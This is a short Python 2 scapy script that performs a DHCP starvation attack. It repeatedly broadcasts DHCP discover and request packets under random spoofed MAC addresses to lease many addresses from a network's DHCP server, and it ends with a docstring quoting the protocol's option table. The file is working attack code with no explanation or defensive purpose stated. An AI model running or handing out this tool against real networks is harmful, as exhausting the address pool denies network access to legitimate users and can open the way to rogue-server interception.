#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import random
import string
import sys
import pdb
import time

conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)


def prepMAC(mac):
   mac = mac.translate(None, ':')
   mac = mac.decode('hex')
   return mac



def DHCPREQUEST(addrUsed, packet, mac):
   for option in range(len(packet[DHCP].options)):
      if packet[DHCP].options[option][0] == 'server_id':
         server_id = packet[DHCP].options[option][1]

   try:
      server_id
   except NameError:
      print "Error: No Server_ID found. Continuing."
      return addrUsed

   bootp = BOOTP(
      xid = packet.xid, # Use random Transaction ID
      secs = packet.secs + 1, # Seconds elapsed  # what if it goes over 0xffff ?
      chaddr = mac)

   DHCPOptions = DHCP(options = [
      ('message-type','request'),
      ('server_id', server_id),
     # ('requested_addr', packet.yiaddr),
      'end'])

   request = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255",ttl=128)/UDP(sport=68,dport=67)/bootp

   while len(request/DHCPOptions) < 342:
      DHCPOptions[DHCP].options.append('pad')

   request = request/DHCPOptions

   ack = srp1(request, timeout=5, retry=-3, verbose=0)


   if ack != None:
      print ack.yiaddr, " : ", ack.dst, ":", hex(ack.xid)
      #time.sleep(5)
      return addrUsed + 1

   return addrUsed



def DHCPDISCOVER(addrUsed):
   mac = RandMAC()

   bootp = BOOTP(
      xid = random.randint(10000,0xffffffff), # Use random Transction ID
      secs = random.randint(0,0xffff), # Seconds elapsed
      chaddr = prepMAC(mac)) # Get random mac

   DHCPOptions = DHCP(options = [
      ('message-type','discover'),
      #('lease_time', 0xffffffff),  # Infinity (Not guaranteed)
      ('client_id', str(random.randint(0,0xffff))),
     # ("requested_addr","10.0.0." + str(random.randint(3,255))), #doesn't really matter
      'end'])

   discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255",ttl=128)/UDP(sport=68,dport=67)/bootp

   while len(discover/DHCPOptions) < 342:
      DHCPOptions[DHCP].options.append('pad')

   discover = discover/DHCPOptions

   offer = srp1(discover, timeout=5, retry=-3, verbose=0)

   if offer != None:
      addrUsed = int(addrUsed)
      addrUsed = DHCPREQUEST(addrUsed, offer, discover.chaddr)

   return addrUsed



def main():
   if len(sys.argv)!=2:
      print "\n\tUsage: ", sys.argv[0], "COUNT\n"
      return

   addrUsed = 0
   while addrUsed < int(sys.argv[1]):
      addrUsed = DHCPDISCOVER(addrUsed)


main()


""" PACKET SPECS


    Option                     DHCPDISCOVER  DHCPREQUEST      DHCPDECLINE,
                                                            DHCPRELEASE
  ------                     ------------  -----------      -----------

  Requested IP address       MAY           MUST NOT         MUST NOT
  IP address lease time      MAY           MAY              MUST NOT
  Use 'file'/'sname' fields  MAY           MAY              MAY
  DHCP message type          DHCPDISCOVER  DHCPREQUEST      DHCPDECLINE/
                                                            DHCPRELEASE
  Client identifier          MAY           MAY              MAY
  Class identifier           SHOULD        SHOULD           MUST NOT
  Server identifier          MUST NOT      MUST (after      MUST
                                           DHCPDISCOVER),
                                           MUST NOT (when
                                           renewing)
  Parameter request list     MAY           MAY              MUST NOT
  Maximum message size       MAY           MAY              MUST NOT
  Message                    SHOULD NOT    SHOULD NOT       SHOULD
  Site-specific              MAY           MAY              MUST NOT
  All others                 MUST NOT      MUST NOT         MUST NOT
"""


